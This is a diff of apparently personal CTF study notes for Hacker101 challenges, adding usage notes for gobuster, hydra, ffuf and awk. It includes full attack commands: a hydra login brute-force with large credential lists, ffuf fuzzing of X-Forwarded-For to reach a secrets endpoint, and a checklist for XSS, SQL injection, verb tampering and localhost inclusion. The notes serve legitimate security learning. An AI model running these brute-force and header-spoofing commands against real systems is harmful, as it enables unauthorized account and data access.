@@ -26,24 +26,67 @@ Kali-menu > password profiling worklist
 	gobuster
 	fuff command
 
-	skipfish # test security for vulnerability
-
+	skipfish # test security for vulnerability : check again and describe more
+	awk
 	
 
 
 	
 	```
-	gobuster dir -u "https://801792902472a746ea6a94e81c370387.ctf.hacker101.com" -w Downloads/combined_words.txt -t 100
+	gobuster dir -u "https://801792902472a746ea6a94e81c370387.ctf.hacker101.com" -w Downloads/combined_words.txt -t 100 -H 'X-Forwarded-Token:0.0.0.0'
 
 	hydra [-l login| -L file]  [-p pass| -P password] [-u] [-f] [IP address][-s PORT] [Module: remote-http] [module-setting]
 	e.g.
 		
 	sudo hydra -L 10k-usernames.txt -P password-biglist.txt -u -f  801792902472a746ea6a94e81c370387.ctf.hacker101.com  https-post-form "/login:username=^USER^&password=^PASS^:F=invalid" -V -t 64
 
-	seq 0 255 > range.txt # Then run ffuf
- 	ffuf -w range.txt:FUZZ1 -w range.txt:FUZZ2 -w range.txt:FUZZ3 -w range.txt:FUZZ4  -u https://0bfd51139862b5a11d4fb8d61b7f4465.ctf.hacker101.com/api/v1/secrets  -H "X-Forwarded-For: FUZZ1.FUZZ2.FUZZ3.FUZZ4"  -mode clusterbomb  -v -o results.json -fc 403,404,500
+	
+	ffuf
+		-mode (clusterbomb|pitchfork) :- all combination are tried, pitchfork: read from all in lock-in state
+		-u URL
+		-request raw_req.txt
+		-reqeust-proto http
+		-X Verbname
+		-H 'HEADER:VALUE'
+		-d '{"UUID":"FUZZ"}' :-  request body data
+		-x "http://localhost:8080" :- proxy to localhost/ could be used for burp proxy
+		-replay-proxy "http://localhost:8080" :- response proxy to localhost/ could be used for burp proxy
+
+		(response code)
+		-mc 200,300-400,all :- all to select everything, request code are matched here
+		-fc
+		(response size)
+		-ms
+		-fs
+		(number of words)
+		-mw
+		-fw
+		(regex)
+		-mr
+		-fr
+		...and more
+
+		(output type)
+		-o filename.txt
+		-of (json|ejson|html,csv)
+
+	e.g.
+		[Not working]
+		ffuf -v -w wordlist.txt –mode pitchfork -request req.txt -mr all -fr “No updatable fields supplied” -f filename -of json
+		
+		[working]
+		ffuf -v -t 400 -w avatar.txt -mode pitchfork -u https://1ff67aa19a5e2e4f4103674ba4b26edb.ctf.hacker101.com/api/v1/user -X PUT -H 'X-Token: 717ef7cb250baaac386db38ad3817e03' -d 'FUZZ=23' -mc all -fr all -mr all  -o result -of csv
+		seq 0 255 > range.txt # Then run ffuf
+
+ 		ffuf -w range.txt:FUZZ1 -w range.txt:FUZZ2 -w range.txt:FUZZ3 -w range.txt:FUZZ4  -u https://0bfd51139862b5a11d4fb8d61b7f4465.ctf.hacker101.com/api/v1/secrets  -H "X-Forwarded-For: FUZZ1.FUZZ2.FUZZ3.FUZZ4"  -mode clusterbomb  -v -o results.json -fc 403,404,500
+
+ 
 
 	
+	```
+	awk examples:
+	```
+	awk -F ',' '$1!=3{ print $1, $3}'
 	```
 
 
@@ -57,8 +100,14 @@ While doing file traversing check if the localhost is also getting mapped
 ?page=http://localhost/index
 ref: Cody’s First Blog CTF
 
-
-
+###
+ find different endpoints
+ attack bruteforce on form
+ check xss
+ check sql injection
+ change verb to see if some other methods are exposed (GET, POST, PUT, DELETE)
+	for POST FORMS: Content-Type: application/x-www-form-urlencoded
+	make sure there is enter at the end of encoding
 
 
 ### PII (Personal Identifiable Information)
